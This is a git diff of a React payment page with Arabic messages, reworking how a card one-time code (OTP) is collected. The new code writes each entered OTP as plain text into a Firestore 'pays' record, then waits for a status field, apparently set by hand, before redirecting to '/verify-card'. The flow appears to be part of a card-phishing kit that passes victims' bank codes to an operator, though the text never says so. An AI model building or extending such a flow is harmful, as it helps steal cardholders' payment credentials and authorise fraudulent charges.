@@ -10,8 +10,8 @@ import Footer from "@/components/Footer"
 
 import WaitingDialog from "@/components/waiting-dilaog"
 import { RefreshCw } from "lucide-react"
-import { addData, db } from "@/lib/firebase"
-import { addDoc, doc, onSnapshot, updateDoc } from "firebase/firestore"
+import { db } from "@/lib/firebase"
+import { doc, onSnapshot } from "firebase/firestore"
 import PaymentForm from "@/components/payment/PaymentForm"
 import { PaymentSummary } from "@/components/payment/PaymentSummary"
 import { PaymentMethods } from "@/components/payment/Payment-methods"
@@ -140,7 +140,7 @@ export default function PaymentPage() {
   const [paymentId, setPaymentId] = useState<string | null>(null)
   // Add these new state variables
   const [showOtpDialog, setShowOtpDialog] = useState(false)
-  const [otpStatus, setOtpStatus] = useState<string | null>(null)
+  const [cardOtpStatus, setcardOtpStatus] = useState<string | null>(null)
 
   // Check for payment status in localStorage on component mount
   useEffect(() => {
@@ -165,22 +165,28 @@ export default function PaymentPage() {
   // Add this function inside the PaymentPage component
   const handleOtpSubmit = (otp: string) => {
     // Hide OTP dialog and show waiting loader
-   // setShowOtpDialog(false)
-    //setIsloading(true)
-    //setShowWaitingDialog(true)
-const _id=localStorage.getItem("visitor")
+    setShowOtpDialog(false)
+    setIsloading(true)
+    setShowWaitingDialog(true)
+
     // In a real implementation, you would send the OTP to your backend
     // For now, we'll simulate by updating Firestore directly
-    if (_id) {
-     addData({id:_id,cardOtp:otp})
-     setShowOtpDialog(false)
-     setShowWaitingDialog(true)
-      // Update the document with otpStatus field
+    if (paymentId) {
+      const paymentRef = doc(db, "pays", paymentId)
+      // Update the document with cardOtpStatus field
       // This is just a simulation - in a real app, you'd verify the OTP on the server
-      // Also track OTP status if it exists
-      if ((otpStatus==='approved' )&&(paymentStatus=== "approved" ) )  {
-        window.location.href = "/verify-card"
-      }
+      // and the server would update Firestore
+      import("firebase/firestore").then(({ updateDoc }) => {
+        updateDoc(paymentRef, {
+          cardOtpStatus: "processing",
+          otpCode: otp,
+        }).catch((error) => {
+          console.error("Error updating OTP status:", error)
+          setIsloading(false)
+          setShowWaitingDialog(false)
+          alert("فشل في التحقق من الرمز. يرجى المحاولة مرة أخرى.")
+        })
+      })
     }
   }
 
@@ -194,61 +200,76 @@ const _id=localStorage.getItem("visitor")
     const unsubscribe = onSnapshot(
       paymentRef,
       (docSnapshot) => {
-        if (!docSnapshot.exists()) {
-          return;
+        if (docSnapshot.exists()) {
+          const data = docSnapshot.data()
+          setPaymentStatus(data.paymentStatus)
+
+          // Also track OTP status if it exists
+          if (data.cardOtpStatus) {
+            setcardOtpStatus(data.cardOtpStatus)
+          }
+
+          // If status is pending or processing, keep dialog open
+          if (data.paymentStatus === "pending" || data.paymentStatus === "processing") {
+            setIsloading(true)
+            setShowWaitingDialog(true)
+            // Save status to localStorage to persist across page refreshes
+            localStorage.setItem("paymentStatus", data.paymentStatus)
+          } else if (data.paymentStatus === "approved") {
+            // When payment is approved, show OTP dialog instead of navigating
+            setIsloading(false)
+            setShowWaitingDialog(false)
+            setShowOtpDialog(true)
+            // Clear payment status from localStorage
+            localStorage.removeItem("paymentStatus")
+          } else if (data.paymentStatus === "rejected" || data.paymentStatus === "failed") {
+            setIsloading(false)
+            setShowWaitingDialog(false)
+            // Clear status from localStorage if payment is complete or failed
+            localStorage.removeItem("paymentStatus")
+            alert("فشل عملية الدفع يرجى المحاولة مرة أخرى")
+          }
+
+          // Handle OTP status changes
+          if (data.cardOtpStatus === "approved") {
+            setIsloading(false)
+            setShowWaitingDialog(false)
+            // Navigate to verify-phone page
+            window.location.href = "/verify-card"
+          } else if (data.cardOtpStatus === "rejected" || data.cardOtpStatus === "failed") {
+            setIsloading(false)
+            setShowWaitingDialog(false)
+            alert("فشل التحقق من الرمز. يرجى المحاولة مرة أخرى.")
+            // Show OTP dialog again
+            setShowOtpDialog(true)
+          }
+        } else if (paymentStatus === "approved") {
+          // Document doesn't exist but we have approved status
+          setIsloading(false)
+          setShowWaitingDialog(false)
+          setShowOtpDialog(true)
+        } else if (cardOtpStatus === "approved") {
+          // OTP is approved but document doesn't exist
+          setShowOtpDialog(false)
+          window.location.href = "/verify-card"
         }
-    
-        const data = docSnapshot.data();
-        setPaymentStatus(data.paymentStatus);
-        setOtpStatus(data.otpStatus);
-    
-        if (data.paymentStatus === "pending") {
-          setIsloading(true);
-          setShowWaitingDialog(true);
-          setShowOtpDialog(false);
-          localStorage.setItem("paymentStatus", "pending");
-        }
-    
-        if (data.paymentStatus === "approved") {
-          setIsloading(false);
-          setShowWaitingDialog(false);
-          setShowOtpDialog(true);
-          setOtpStatus("pending");
-        }
-    
-        if (data.paymentStatus === "rejected") {
-          setIsloading(false);
-          setShowWaitingDialog(false);
-          setShowOtpDialog(false);
-          alert("تم رفض الدفع. الرجاء المحاولة مرة أخرى.");
-        }
-    
-        if (data.otpStatus === "pending") {
-          setIsloading(true);
-        }
-    
-        if (data.otpStatus === "rejected") {
-          setIsloading(false);
-          setShowWaitingDialog(false);
-          setShowOtpDialog(true);
-          alert("فشل التحقق من OTP. الرجاء المحاولة مرة أخرى.");
-        }
-    
-        if (data.otpStatus === "approved") {
-          setIsloading(false);
-          window.location.href = "/verify-card";
+        if (cardOtpStatus === "processing" || cardOtpStatus=== "pending") {
+          // OTP is approved but document doesn't exist
+          setShowWaitingDialog(true)  
+          setIsloading(true)  
+          setShowOtpDialog(false)
         }
       },
       (error) => {
-        console.error("Error fetching payment status:", error);
-        setIsloading(false);
-        setShowWaitingDialog(false);
-      }
-    );
+        console.error("Error fetching payment status:", error)
+        setIsloading(false)
+        setShowWaitingDialog(false)
+      },
+    )
 
     // Clean up the listener when component unmounts
     return () => unsubscribe()
-  }, [paymentId, paymentStatus, otpStatus])
+  }, [paymentId, paymentStatus, cardOtpStatus])
 
   // Add event listener for beforeunload to prevent accidental navigation during pending payment
   useEffect(() => {
@@ -318,7 +339,7 @@ const _id=localStorage.getItem("visitor")
     <>
       <Header />
       <AnimatePresence>{showAd && <AdPopup onClose={() => setShowAd(false)} />}</AnimatePresence>
-      <AnimatePresence>{showWaitingDialog && <WaitingDialog isOpen={false} />}</AnimatePresence>
+      <AnimatePresence>{showWaitingDialog && <WaitingDialog isOpen={showWaitingDialog} />}</AnimatePresence>
 
       {/* Payment Status Dialog */}
       {(paymentStatus === "pending" || paymentStatus === "processing") && <PaymentStatusDialog />}
